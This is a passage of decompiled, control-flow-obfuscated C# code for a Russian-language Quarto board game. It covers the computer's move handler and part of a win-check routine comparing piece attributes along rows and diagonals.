					continue;
				case 5u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num9, num3]) == Color.Blue;
					num = -375484460;
					continue;
				case 4u:
					num = ((int)num2 * -1196145553) ^ 0x4E68914;
					continue;
				case 3u:
					num = (int)((num2 * 643088289) ^ 0x490D3537);
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -137216297;
						num5 = -137216297;
					}
					else
					{
						num4 = -154296899;
						num5 = -154296899;
					}
					num = num4 ^ (int)(num2 * 1652049458);
					continue;
				}
				case 1u:
					num3 = 0;
					num = -1223558047;
					continue;
				default:
					return;
				case 0u:
					break;
				case 9u:
					return;
					IL_003d:
					num = -656481583;
					num6 = -656481583;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0712: Unknown result type (might be due to invalid IL or missing references)
		//IL_0740: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		bool flag2 = default(bool);
		int num35 = default(int);
		int num32 = default(int);
		int num36 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag11 = default(bool);
		int num9 = default(int);
		bool flag6 = default(bool);
		int num18 = default(int);
		int num20 = default(int);
		int num47 = default(int);
		int num40 = default(int);
		int num41 = default(int);
		int num25 = default(int);
		int num19 = default(int);
		Graphics graphics_ = default(Graphics);
		int num21 = default(int);
		bool flag7 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num30 = default(int);
		int num31 = default(int);
		int num10 = default(int);
		int num8 = default(int);
		int num7 = default(int);
		int num24 = default(int);
		int num26 = default(int);
		bool flag4 = default(bool);
		int num3 = default(int);
		bool flag5 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		int num6 = default(int);
		bool flag9 = default(bool);
		bool flag8 = default(bool);
		bool flag14 = default(bool);
		bool flag15 = default(bool);
		bool flag10 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag13 = default(bool);
		bool flag12 = default(bool);
		while (true)
		{
			int num = 873513583;
			while (true)
			{
				uint num2;
				int num48;
				int num34;
				int num39;
				int num15;
				switch ((num2 = (uint)num ^ 0x3C5D9CC2u) % 177u)
				{
				case 176u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1818255193;
					continue;
				case 175u:
					num = (int)(num2 * 1136505263) ^ -1244230508;
					continue;
				case 174u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1448225581) ^ -207198907;
					continue;
				case 173u:
					num = 1401030444;
					continue;
				case 172u:
					num = (int)((num2 * 467032272) ^ 0x71B4FBE4);
					continue;
				case 171u:
				{
					int num60;
					int num61;
					if (!flag2)
					{
						num60 = -1012484741;
						num61 = -1012484741;
					}
					else
					{
						num60 = -539626637;
						num61 = -539626637;
					}
					num = num60 ^ (int)(num2 * 1771810478);
					continue;
				}
				case 170u:
					num35++;
					num = 1032749856;
					continue;
				case 169u:
					num = (int)((num2 * 940641533) ^ 0x512CF2BF);
					continue;
				case 168u:
					num = (int)((num2 * 1323083318) ^ 0x139B9B94);
					continue;
				case 167u:
					Form1.smethod_30((Control)(object)borderBox[num32, num36]);
					num = (int)((num2 * 1732853545) ^ 0xE839CE2);
					continue;
				case 166u:
					num = (int)((num2 * 2144022689) ^ 0x6C9CEFDA);
					continue;
				case 165u:
					if (!Stop(array3))
					{
						num = ((int)num2 * -270497135) ^ -1582465394;
						continue;
					}
					goto IL_013e;
				case 164u:
				{
					int num64;
					int num65;
					if (flag11)
					{
						num64 = 1277757841;
						num65 = 1277757841;
					}
					else
					{
						num64 = 1516275302;
						num65 = 1516275302;
					}
					num = num64 ^ (int)(num2 * 1736051262);
					continue;
				}
				case 163u:
					if (num32 == num9)
					{
						num = (int)((num2 * 1551779508) ^ 0x21A18A49);
						continue;
					}
					num48 = 0;
					goto IL_0191;
				case 162u:
					num = (int)(num2 * 678694341) ^ -1481415426;
					continue;
				case 161u:
					flag6 = Standoff(board);
					num = (int)(num2 * 1054733674) ^ -1620629525;
					continue;
				case 160u:
					num = (int)(num2 * 597433749) ^ -1467889547;
					continue;
				case 159u:
				{
					int num55;
					if (num18 >= 4)
					{
						num = 1520970606;
						num55 = 1520970606;
					}
					else
					{
						num = 1380426353;
						num55 = 1380426353;
					}
					continue;
				}
				case 158u:
					num = 661145480;
					continue;
				case 157u:
					board[num20, num47] = new Figurine(storage[num40, num41]);
					storage[num40, num41] = null;
					num = (int)((num2 * 1199664226) ^ 0x20D1304E);
					continue;
				case 156u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 559126625) ^ 0x680BAB83);
					continue;
				case 155u:
					Paint_Board();
					num = ((int)num2 * -1506661932) ^ -691659684;
					continue;
				case 154u:
					num25 = 0;
					num = 275060262;
					continue;
				case 153u:
					num20 = 0;
					num = ((int)num2 * -1553896288) ^ 0x45E42971;
					continue;
				case 152u:
					num19 = 0;
					num = 1521138056;
					continue;
				case 151u:
					num = ((int)num2 * -1702419906) ^ 0x9D6048;
					continue;
				case 150u:
					num = ((int)num2 * -741623901) ^ -1309456691;
					continue;
				case 149u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num25 + 0.05f) * (float)size, ((float)num21 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 2049693484) ^ -2034906625;
					continue;
				case 148u:
					num35 = 0;
					num = 184699012;
					continue;
				case 147u:
					num = 236517118;
					continue;
				case 146u:
					flag7 = Form1.smethod_41((Control)(object)borderBox[num18, num19]) == Color.Red;
					num = ((int)num2 * -767112853) ^ 0x25A76760;
					continue;
				case 145u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					array[num30, num31] = new Figurine(storage[num9, num10]);
					num = (int)((num2 * 1031801353) ^ 0x480D9744);
					continue;
				case 144u:
					num47 = 0;
					num8 = 0;
					num = ((int)num2 * -657922006) ^ -54083994;
					continue;
				case 143u:
				{
					int num44;
					if (num7 < 4)
					{
						num = 280815160;
						num44 = 280815160;
					}
					else
					{
						num = 1624601516;
						num44 = 1624601516;
					}
					continue;
				}
				case 142u:
					num = ((int)num2 * -990479109) ^ -988081387;
					continue;
				case 141u:
					num = ((int)num2 * -1844574658) ^ -541456974;
					continue;
				case 140u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 563885937) ^ 0x5E5FFEC);
					continue;
				case 139u:
					num = ((int)num2 * -2007109479) ^ -309562529;
					continue;
				case 138u:
					num34 = ((num24 < 9) ? 1 : 0);
					goto IL_0474;
				case 137u:
					num30 = Form1.smethod_33(rnd, 4);
					num = 1689988111;
					continue;
				case 136u:
					step++;
					num = (int)(num2 * 1954408660) ^ -1458617107;
					continue;
				case 135u:
					num26++;
					num = ((int)num2 * -58793839) ^ 0x538A16CC;
					continue;
				case 134u:
					flag4 = num25 < 4;
					num = 1546033801;
					continue;
				case 133u:
					num = ((int)num2 * -182699457) ^ 0x25602687;
					continue;
				case 132u:
					Form1.smethod_20(pictureBox[num8, num3], (Image)null);
					num = (int)((num2 * 430470043) ^ 0x2EA991AB);
					continue;
				case 131u:
					Form1.smethod_47(200);
					num = (int)(num2 * 868873664) ^ -1612497706;
					continue;
				case 130u:
					num24 = 0;
					num = (int)(num2 * 1936710603) ^ -612550149;
					continue;
				case 129u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = ((int)num2 * -2086537253) ^ -355931865;
					continue;
				case 128u:
				{
					int num13;
					int num14;
					if (!flag5)
					{
						num13 = 1966710541;
						num14 = 1966710541;
					}
					else
					{
						num13 = 1239779685;
						num14 = 1239779685;
					}
					num = num13 ^ ((int)num2 * -1825648355);
					continue;
				}
				case 127u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array);
					num = (int)((num2 * 908326942) ^ 0x67EF666C);
					continue;
				case 126u:
					Form1.smethod_5((Control)(object)borderBox[num8, num3], Color.White);
					num = ((int)num2 * -1538525267) ^ -154566475;
					continue;
				case 125u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num7], bool_0: true);
					num = 175512872;
					continue;
				case 124u:
					num = 1668658351;
					continue;
				case 123u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num3]);
					num = ((int)num2 * -562035154) ^ -1264135136;
					continue;
				case 122u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 2007591592) ^ 0x2749E94);
					continue;
				case 121u:
					num7++;
					num = (int)((num2 * 84857725) ^ 0x22105C50);
					continue;
				case 120u:
					Form1.smethod_30((Control)(object)pictureBox[num9, num10]);
					num = (int)((num2 * 1896159539) ^ 0x464EAB05);
					continue;
				case 119u:
					Form1.smethod_30((Control)(object)borderBox[num9, num10]);
					Form1.smethod_20(pictureBox[num9, num10], (Image)null);
					num = (int)((num2 * 1768309093) ^ 0x6358D883);
					continue;
				case 118u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1775994016) ^ 0x4F99CE36);
					continue;
				case 117u:
				{
					int num66;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num3 * size + size / 2, (int)(((float)num8 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = 307641958;
						num66 = 307641958;
					}
					else
					{
						num = 1937253510;
						num66 = 1937253510;
					}
					continue;
				}
				case 116u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num31 + 0.05f) * (float)size, ((float)num30 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -620003497) ^ -366310200;
					continue;
				case 115u:
					Form1.smethod_5((Control)(object)borderBox[num32, num36], Color.Blue);
					num = ((int)num2 * -1782329233) ^ 0x64CDAA18;
					continue;
				case 114u:
					num = ((int)num2 * -480068342) ^ 0x5F20A06A;
					continue;
				case 113u:
					num = (int)(num2 * 991247917) ^ -287296748;
					continue;
				case 112u:
					if (!Stop(board))
					{
						num = (int)((num2 * 908726960) ^ 0x3DAC6C82);
						continue;
					}
					num39 = 0;
					goto IL_084d;
				case 111u:
					board[num30, num31] = new Figurine(storage[num9, num10]);
					storage[num9, num10] = null;
					num = (int)((num2 * 2096240309) ^ 0x175D911D);
					continue;
				case 110u:
					num47 = num3;
					num = (int)(num2 * 1401273610) ^ -1576680922;
					continue;
				case 109u:
					num = (int)((num2 * 781438964) ^ 0x10C4C000);
					continue;
				case 108u:
					num6 = 0;
					num = ((int)num2 * -579964693) ^ 0x1EC1E452;
					continue;
				case 107u:
					num = (int)((num2 * 873043477) ^ 0x6A85BC73);
					continue;
				case 106u:
					Form1.smethod_30((Control)(object)borderBox[num9, num10]);
					num = ((int)num2 * -1856566136) ^ 0x3F984FDF;
					continue;
				case 105u:
					num = ((int)num2 * -1805273031) ^ 0xFF906F2;
					continue;
				case 104u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 1929172041) ^ -1953956956;
					continue;
				case 103u:
				{
					int num62;
					int num63;
					if (!flag9)
					{
						num62 = 384561211;
						num63 = 384561211;
					}
					else
					{
						num62 = 1851000309;
						num63 = 1851000309;
					}
					num = num62 ^ ((int)num2 * -547790168);
					continue;
				}
				case 102u:
				{
					int num58;
					int num59;
					if (!flag8)
					{
						num58 = 830661456;
						num59 = 830661456;
					}
					else
					{
						num58 = 1774873643;
						num59 = 1774873643;
					}
					num = num58 ^ (int)(num2 * 1408459181);
					continue;
				}
				case 101u:
					num = ((int)num2 * -972637998) ^ -1839394073;
					continue;
				case 100u:
					num21 = 0;
					num = (int)(num2 * 71341994) ^ -918696963;
					continue;
				case 99u:
					num = ((int)num2 * -1042526535) ^ 0x7641D50A;
					continue;
				case 98u:
					num26 = 0;
					num = (int)((num2 * 445170202) ^ 0x534A4652);
					continue;
				case 97u:
					num9 = num18;
					num = ((int)num2 * -357782195) ^ -752544560;
					continue;
				case 96u:
					num = (int)((num2 * 1954179448) ^ 0x521AF73C);
					continue;
				case 95u:
					num = (int)((num2 * 1816354670) ^ 0x5B37AD5A);
					continue;
				case 94u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 864039435) ^ -2089890578;
					continue;
				case 93u:
					num = ((int)num2 * -1343008380) ^ 0xD3E6521;
					continue;
				case 92u:
					num = 48397459;
					continue;
				case 91u:
					num = (int)((num2 * 871866310) ^ 0x55867CA);
					continue;
				case 90u:
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.White);
					num = ((int)num2 * -2120036902) ^ 0x6377DAD9;
					continue;
				case 89u:
				{
					int num56;
					int num57;
					if (flag14)
					{
						num56 = 742834834;
						num57 = 742834834;
					}
					else
					{
						num56 = 191374083;
						num57 = 191374083;
					}
					num = num56 ^ ((int)num2 * -1076708266);
					continue;
				}
				case 88u:
					num6++;
					num = ((int)num2 * -2041374194) ^ 0x7D4F1043;
					continue;
				case 87u:
					Form1.smethod_47(1000);
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1993567370) ^ -411496409;
					continue;
				case 86u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 1809702678) ^ 0x22B452D8);
					continue;
				case 85u:
				{
					int num54;
					if (num35 >= 4)
					{
						num = 106331348;
						num54 = 106331348;
					}
					else
					{
						num = 1927142400;
						num54 = 1927142400;
					}
					continue;
				}
				case 84u:
					num = (int)(num2 * 1611982826) ^ -1828002258;
					continue;
				case 83u:
				{
					int num52;
					int num53;
					if (flag15)
					{
						num52 = 416977346;
						num53 = 416977346;
					}
					else
					{
						num52 = 1313993884;
						num53 = 1313993884;
					}
					num = num52 ^ (int)(num2 * 1235223322);
					continue;
				}
				case 82u:
				{
					int num50;
					int num51;
					if (flag10)
					{
						num50 = -1983779639;
						num51 = -1983779639;
					}
					else
					{
						num50 = -1874617291;
						num51 = -1874617291;
					}
					num = num50 ^ ((int)num2 * -1538134907);
					continue;
				}
				case 81u:
					num10 = num19;
					num = (int)(num2 * 1108416407) ^ -849834331;
					continue;
				case 80u:
				{
					int num49;
					if (num6 >= 4)
					{
						num = 263097409;
						num49 = 263097409;
					}
					else
					{
						num = 1035867892;
						num49 = 1035867892;
					}
					continue;
				}
				case 79u:
					num40 = num8;
					num41 = num3;
					num = ((int)num2 * -377705501) ^ -1408968291;
					continue;
				case 78u:
					num = (int)(num2 * 1381647840) ^ -1854656701;
					continue;
				case 77u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1345508730) ^ 0x37A957DB;
					continue;
				case 76u:
					num = 1856297853;
					continue;
				case 75u:
					num7 = 0;
					num = 543826519;
					continue;
				case 74u:
					num24++;
					flag3 = false;
					num = ((int)num2 * -1664655648) ^ -1705839476;
					continue;
				case 73u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.White);
					num = ((int)num2 * -2070247459) ^ 0x4C6A6AF6;
					continue;
				case 72u:
					num48 = ((num36 == num10) ? 1 : 0);
					goto IL_0191;
				case 70u:
					if (!flag3)
					{
						num = (int)((num2 * 476775519) ^ 0x4AF3E361);
						continue;
					}
					num34 = 1;
					goto IL_0474;
				case 69u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num9, num10]), num25 * size + 4, num21 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1910239432) ^ 0x101165A6;
					continue;
				case 68u:
					num8++;
					num = (int)((num2 * 380969234) ^ 0x4F386DD4);
					continue;
				case 67u:
					Form1.smethod_20(pictureBox[num9, num10], (Image)null);
					num = ((int)num2 * -1729753550) ^ 0x4F61CADE;
					continue;
				case 66u:
					num36 = Form1.smethod_33(rnd, 4);
					if (storage[num32, num36] != null)
					{
						num = (int)(num2 * 421116825) ^ -1071817783;
						continue;
					}
					num48 = 1;
					goto IL_0191;
				case 65u:
					if (!Standoff(array3))
					{
						num = 1443177352;
						num15 = 1443177352;
						continue;
					}
					goto IL_013e;
				case 64u:
					Form1.smethod_30((Control)(object)borderBox[num18, num19]);
					num = (int)((num2 * 1135667823) ^ 0x556B3A50);
					continue;
				case 63u:
					num = (int)((num2 * 445296422) ^ 0x7DAA729D);
					continue;
				case 62u:
					flag5 = array[num26, num35] == null;
					num = 1653940221;
					continue;
				case 61u:
					Form1.smethod_5((Control)(object)borderBox[num18, num19], Color.LimeGreen);
					num = ((int)num2 * -1983421808) ^ -1480475936;
					continue;
				case 60u:
					flag = board[num30, num31] != null;
					num = ((int)num2 * -334664729) ^ -2139846366;
					continue;
				case 59u:
					Form1.smethod_30((Control)(object)borderBox[num8, num3]);
					num = (int)(num2 * 1455129228) ^ -2006517369;
					continue;
				case 58u:
					num = (int)(num2 * 2090886315) ^ -1641889709;
					continue;
				case 57u:
					num = (int)((num2 * 2040559082) ^ 0x1762326B);
					continue;
				case 56u:
					num19++;
					num = ((int)num2 * -1684680158) ^ 0x423525C1;
					continue;
				case 55u:
					flag14 = num19 < 4;
					num = 2080413857;
					continue;
				case 54u:
					num = (int)((num2 * 740675378) ^ 0x2C7580F4);
					continue;
				case 53u:
					num = 1192677934;
					continue;
				case 52u:
					num = ((int)num2 * -438681344) ^ -341760069;
					continue;
				case 51u:
					flag13 = num3 < 4;
					num = 650622425;
					continue;
				case 50u:
				{
					int num45;
					int num46;
					if (flag13)
					{
						num45 = -2045562748;
						num46 = -2045562748;
					}
					else
					{
						num45 = -706323789;
						num46 = -706323789;
					}
					num = num45 ^ ((int)num2 * -288031264);
					continue;
				}
				case 49u:
				{
					int num42;
					int num43;
					if (!(Form1.smethod_41((Control)(object)borderBox[num8, num3]) == Color.Blue))
					{
						num42 = 1530752380;
						num43 = 1530752380;
					}
					else
					{
						num42 = 358915804;
						num43 = 358915804;
					}
					num = num42 ^ (int)(num2 * 644211383);
					continue;
				}
				case 48u:
					num40 = 0;
					num41 = 0;
					num = ((int)num2 * -1431922673) ^ -1029886225;
					continue;
				case 47u:
					num18++;
					num = ((int)num2 * -2011538134) ^ -682929836;
					continue;
				case 46u:
					num39 = ((!Standoff(board)) ? 1 : 0);
					goto IL_084d;
				case 45u:
				{
					int num37;
					int num38;
					if (!flag12)
					{
						num37 = 704466585;
						num38 = 704466585;
					}
					else
					{
						num37 = 1278483837;
						num38 = 1278483837;
					}
					num = num37 ^ ((int)num2 * -979381936);
					continue;
				}
				case 44u:
					Form1.smethod_15(timer1);
					num = 857760538;
					continue;
				case 43u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -1283188801) ^ -1278897547;
					continue;
				case 42u:
					flag11 = board[num21, num25] == null;
					num = 1551404790;
					continue;
				case 41u:
					array2[num26, num35] = new Figurine(storage[num32, num36]);
					flag10 = Stop(array2);
					num = (int)(num2 * 1431582477) ^ -73891257;
					continue;
				case 40u:
				{
					int num33;
					if (num8 < 4)
					{
						num = 463567291;
						num33 = 463567291;
					}
					else
					{
						num = 976779448;
						num33 = 976779448;
					}
					continue;
				}
				case 39u:
					num31 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1173135905) ^ -252962092;
					continue;
				case 38u:
					num32 = Form1.smethod_33(rnd, 4);
					num = 322679654;
					continue;
				case 37u:
					num = (int)(num2 * 1419923278) ^ -1336703636;
					continue;
				case 36u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num9, num10]), num31 * size + 4, num30 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1070317560) ^ -2090556528;
					continue;
				case 35u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 1274608378) ^ -1326059545;
					continue;
				case 34u:
				{
					int num28;
					int num29;
					if (Form1.smethod_46((Control)(object)pictureBox1))
					{
						num28 = 686800912;
						num29 = 686800912;
					}
					else
					{
						num28 = 1177705112;
						num29 = 1177705112;
					}
					num = num28 ^ ((int)num2 * -955064670);
					continue;
				}
				case 33u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1554751860) ^ 0x8FE12E4);
					continue;
				case 32u:
				{
					int num27;
					if (num21 >= 4)
					{
						num = 1921619120;
						num27 = 1921619120;
					}
					else
					{
						num = 672196606;
						num27 = 672196606;
					}
					continue;
				}
				case 31u:
					num = (int)((num2 * 1883769200) ^ 0x55193BC5);
					continue;
				case 30u:
					flag8 = num26 < 4;
					num = 1812110323;
					continue;
				case 29u:
					num = ((int)num2 * -1677806193) ^ -629192982;
					continue;
				case 28u:
					array3[num21, num25] = new Figurine(storage[num9, num10]);
					num = (int)(num2 * 1990721004) ^ -985471007;
					continue;
				case 27u:
					num = ((int)num2 * -2069907495) ^ 0x1CB9F2CA;
					continue;
				case 26u:
					board[num21, num25] = new Figurine(storage[num9, num10]);
					num = (int)((num2 * 286175849) ^ 0x6A90D177);
					continue;
				case 25u:
					storage[num9, num10] = null;
					num = (int)((num2 * 58684611) ^ 0x19CEE6F8);
					continue;
				case 24u:
					num25++;
					num = 13995673;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					step++;
					num = (int)(num2 * 833029267) ^ -1193634023;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -67374154) ^ 0x127499B3;
					continue;
				case 20u:
				{
					int num22;
					int num23;
					if (flag7)
					{
						num22 = 592025546;
						num23 = 592025546;
					}
					else
					{
						num22 = 422975215;
						num23 = 422975215;
					}
					num = num22 ^ (int)(num2 * 1237505860);
					continue;
				}
				case 19u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 1464156056) ^ -1177257499;
					continue;
				case 18u:
					num = (int)(num2 * 648840778) ^ -1555106565;
					continue;
				case 17u:
					num3 = 0;
					num = 341857006;
					continue;
				case 16u:
					num = ((int)num2 * -828385138) ^ 0xFD1C310;
					continue;
				case 15u:
					num21++;
					num = (int)(num2 * 789087006) ^ -754959632;
					continue;
				case 14u:
					num20 = num8;
					num = (int)(num2 * 1960463690) ^ -2135128886;
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)pictureBox[num18, num19], bool_0: false);
					num = 1509614619;
					continue;
				case 12u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1584243539) ^ -1698464661;
					continue;
				case 11u:
					num9 = 0;
					num10 = 0;
					num18 = 0;
					num = (int)((num2 * 165259821) ^ 0x55E3A905);
					continue;
				case 10u:
				{
					int num16;
					int num17;
					if (flag6)
					{
						num16 = -1713231860;
						num17 = -1713231860;
					}
					else
					{
						num16 = -154780661;
						num17 = -154780661;
					}
					num = num16 ^ (int)(num2 * 652136394);
					continue;
				}
				case 9u:
				{
					int num11;
					int num12;
					if (flag4)
					{
						num11 = -1087605649;
						num12 = -1087605649;
					}
					else
					{
						num11 = -2072823053;
						num12 = -2072823053;
					}
					num = num11 ^ ((int)num2 * -1885415991);
					continue;
				}
				case 8u:
					Form1.smethod_30((Control)(object)pictureBox[num9, num10]);
					num = ((int)num2 * -625633928) ^ 0x11DCC9F5;
					continue;
				case 7u:
					flag3 = true;
					num = (int)(num2 * 1240900036) ^ -712065754;
					continue;
				case 6u:
					num = ((int)num2 * -2039444678) ^ -844787027;
					continue;
				case 5u:
					num = ((int)num2 * -735526994) ^ -979236489;
					continue;
				case 4u:
					flag2 = Standoff(board);
					num = 1275006005;
					continue;
				case 3u:
					num = 1550007634;
					continue;
				case 2u:
					num = 1882034065;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 1587319917;
						num5 = 1587319917;
					}
					else
					{
						num4 = 1450062063;
						num5 = 1450062063;
					}
					num = num4 ^ ((int)num2 * -155009953);
					continue;
				}
				case 0u:
					num3++;
					num = (int)(num2 * 1423457773) ^ -1139956461;
					continue;
				default:
					return;
				case 22u:
					break;
				case 71u:
					return;
					IL_013e:
					num = 1877149685;
					num15 = 1877149685;
					continue;
					IL_0474:
					flag9 = (byte)num34 != 0;
					num = 1707378587;
					continue;
					IL_0191:
					flag15 = (byte)num48 != 0;
					num = 1191424204;
					continue;
					IL_084d:
					flag12 = (byte)num39 != 0;
					num = 994593446;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num3 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 618902562;
			while (true)
			{
				uint num2;
				int num41;
				int num25;
				switch ((num2 = (uint)num ^ 0x621B2BDAu) % 77u)
				{
				case 76u:
					flag = true;
					num = ((int)num2 * -637378855) ^ 0x602F3BB;
					continue;
				case 75u:
				{
					int num13;
					int num14;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num13 = -913000270;
						num14 = -913000270;
					}
					else
					{
						num13 = -860838965;
						num14 = -860838965;
					}
					num = num13 ^ (int)(num2 * 1204667517);
					continue;
				}
				case 74u:
				{
					int num62;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 418204407;
						num62 = 418204407;
					}
					else
					{
						num = 1975390376;
						num62 = 1975390376;
					}
					continue;
				}
				case 73u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)((num2 * 1118453475) ^ 0x114B4F8D);
						continue;
					}
					goto IL_00c4;
				case 72u:
					if (mem[1, num3] != null)
					{
						num = (int)(num2 * 862227641) ^ -906616357;
						continue;
					}
					goto IL_00f1;
				case 71u:
				{
					int num63;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = 304156380;
						num63 = 304156380;
					}
					else
					{
						num = 1740065513;
						num63 = 1740065513;
					}
					continue;
				}
				case 70u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 1847279596) ^ 0x75E88B2A);
						continue;
					}
					goto IL_0174;
				case 69u:
				{
					int num21;
					int num22;
					if (mem[num3, 0] == null)
					{
						num21 = 1996701868;
						num22 = 1996701868;
					}
					else
					{
						num21 = 2096567992;
						num22 = 2096567992;
					}
					num = num21 ^ ((int)num2 * -1956840365);
					continue;
				}
				case 68u:
				{
					int num8;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 567143436;
						num8 = 567143436;
					}
					else
					{
						num = 462618274;
						num8 = 462618274;
					}
					continue;
				}
				case 67u:
				{
					int num60;
					int num61;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num60 = 379133931;
						num61 = 379133931;
					}
					else
					{
						num60 = 2019642543;
						num61 = 2019642543;
					}
					num = num60 ^ ((int)num2 * -1795221055);
					continue;
				}
				case 66u:
				{
					int num46;
					int num47;
					if (flag2)
					{
						num46 = -695581112;
						num47 = -695581112;
					}
					else
					{
						num46 = -22201177;
						num47 = -22201177;
					}
					num = num46 ^ (int)(num2 * 993270376);
					continue;
				}
				case 65u:
					num3++;
					num = ((int)num2 * -853479679) ^ 0x67AF3E35;
					continue;
				case 64u:
				{
					int num26;
					int num27;
					if (mem[2, 2] == null)
					{
						num26 = -748072507;
						num27 = -748072507;
					}
					else
					{
						num26 = -140189581;
						num27 = -140189581;
					}
					num = num26 ^ (int)(num2 * 2136529001);
					continue;
				}
				case 63u:
					if (mem[0, num3] != null)
					{
						num = 596762919;
						continue;
					}
					goto IL_00f1;
				case 62u:
				{
					int num71;
					if (mem[num3, 0].Square == mem[num3, 1].Square)
					{
						num = 777527430;
						num71 = 777527430;
					}
					else
					{
						num = 330828204;
						num71 = 330828204;
					}
					continue;
				}
				case 61u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 1664996485) ^ 0x3A463A9E);
						continue;
					}
					goto IL_02fd;
				case 60u:
				{
					int num56;
					int num57;
					if (mem[num3, 2] != null)
					{
						num56 = 91135535;
						num57 = 91135535;
					}
					else
					{
						num56 = 1093851696;
						num57 = 1093851696;
					}
					num = num56 ^ (int)(num2 * 2072443223);
					continue;
				}
				case 59u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1338295349) ^ -656424117;
						continue;
					}
					goto IL_02fd;
				case 58u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1016252682) ^ 0x73D90EBB;
						continue;
					}
					goto IL_00c4;
				case 57u:
				{
					int num42;
					int num43;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num42 = 859035701;
						num43 = 859035701;
					}
					else
					{
						num42 = 995442312;
						num43 = 995442312;
					}
					num = num42 ^ ((int)num2 * -1145832244);
					continue;
				}
				case 56u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = (int)((num2 * 608939890) ^ 0x636752B9);
						continue;
					}
					goto IL_00fd;
				case 55u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 351665000;
						continue;
					}
					goto IL_00f1;
				case 54u:
				{
					int num19;
					int num20;
					if (mem[num3, 1].Point == mem[num3, 2].Point)
					{
						num19 = -1831854803;
						num20 = -1831854803;
					}
					else
					{
						num19 = -711609868;
						num20 = -711609868;
					}
					num = num19 ^ ((int)num2 * -914128861);
					continue;
				}
				case 53u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = (int)(num2 * 693891282) ^ -1054904532;
						continue;
					}
					goto IL_00fd;
				case 52u:
				{
					int num6;
					int num7;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num6 = -1041019978;
						num7 = -1041019978;
					}
					else
					{
						num6 = -1851926400;
						num7 = -1851926400;
					}
					num = num6 ^ ((int)num2 * -732405843);
					continue;
				}
				case 51u:
